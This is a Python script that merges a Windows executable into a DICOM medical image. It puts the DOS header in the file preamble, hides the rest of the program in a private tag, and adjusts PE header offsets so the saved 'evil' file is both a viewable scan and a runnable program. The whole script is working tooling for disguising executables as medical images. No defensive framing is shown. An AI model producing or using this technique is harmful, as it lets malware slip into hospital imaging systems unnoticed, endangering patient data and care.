
from ctypes import sizeof
import sys
import pydicom
import pefile
from ctypes import sizeof
import matplotlib.pyplot as plt

def test(evilPath, sizeofDicomMetaData, resultDicom, varaibleDOS):
    resultDicom=open(evilPath, 'rb')
    resultData=resultDicom.read(128+4+sizeofDicomMetaData+24)
    print(resultData)
    resultDicom.close()



def SnipDOSFromPE(pePath, sizeofDicomMetaData):
    peFile=pefile.PE(pePath)
    DOS_Header=peFile.DOS_HEADER.dump_dict()
    #Find the length of the DOS Stub
    variable_length=DOS_Header['e_lfanew']['Value']
    variable_length=variable_length - 112
    print(variable_length)
    # change the elf_new value to appropraite  value

    DOS_Header = peFile.DOS_HEADER
    DOS_Header.e_lfanew = variable_length+4+sizeofDicomMetaData+24

    peFile.write(filename='./result_files/intermediatePE.exe')
    peFile.close()

    # read DoSHeader + DoS Stub
    file = open('./result_files/intermediatePE.exe','rb')
    dos_part_of_PE=file.read(variable_length)
    file.close()

    return dos_part_of_PE, variable_length


def SnipRemainingFromPE(pePath, PE_Headers_Start,sizeofDicomMetaData):

    peFile=pefile.PE(pePath)

    fileAlignment=peFile.OPTIONAL_HEADER.FileAlignment
    print(fileAlignment)
    oldHeaderSize=peFile.OPTIONAL_HEADER.SizeOfHeaders
    newHeaderSize=oldHeaderSize+4+sizeofDicomMetaData+24
    extraBytes=(newHeaderSize%fileAlignment)
    print(extraBytes)
    paddingNeeded=fileAlignment - extraBytes
    newHeaderSize +=paddingNeeded

    # change the sizeofheaders file

    peFile.OPTIONAL_HEADER.SizeOfHeaders=newHeaderSize

    # change the pointer to raw data

    for section in peFile.sections:
        section.PointerToRawData+=(newHeaderSize-oldHeaderSize)

    peFile.write(filename='./result_files/intermediatePE.exe')
    peFile.close()

    file = open('./result_files/intermediatePE.exe','rb')
    file.seek(PE_Headers_Start, 0)
    pe_header=file.read(oldHeaderSize-PE_Headers_Start)

    # creating padding bytes and concatenate them with the header

    padding=bytes(paddingNeeded)
    pe_header+= padding
    file.seek(oldHeaderSize, 0)
    remaining_pe=file.read()
    pe_header+=remaining_pe
    file.close()
    return pe_header



def createPEDicom(pePath, dicomPath, evilPath):
    #get dicom meta data and it's size
    dicomDataset= pydicom.dcmread(dicomPath, force=True)
    dicomDataset.save_as(evilPath, write_like_original=False)
    dicomDataset=pydicom.dcmread(evilPath, force=True)
    sizeofDicomMetaData=dicomDataset.file_meta['FileMetaInformationGroupLength'].value
    # Snip variable DOS from the PE file
    variableDOS, PE_Headers_Start= SnipDOSFromPE(pePath, sizeofDicomMetaData)
    # Snip the rest of the file and add it as the part of private tag of dicom
    remaining_PE_file=SnipRemainingFromPE(pePath, PE_Headers_Start, sizeofDicomMetaData)
    # create new DICOM file with DOS header as preamble and remaining PE file in private tag.
    dicomDataset.preamble = variableDOS
    dicomDataset.add_new((0X0003, 0X0010), 'UN', remaining_PE_file)
    dicomDataset.save_as(evilPath,write_like_original=False)

   
    plt.imshow(dicomDataset.pixel_array, cmap=plt.cm.bone)
    plt.show()



if __name__=="__main__":
    createPEDicom(sys.argv[1], sys.argv[2], sys.argv[3])

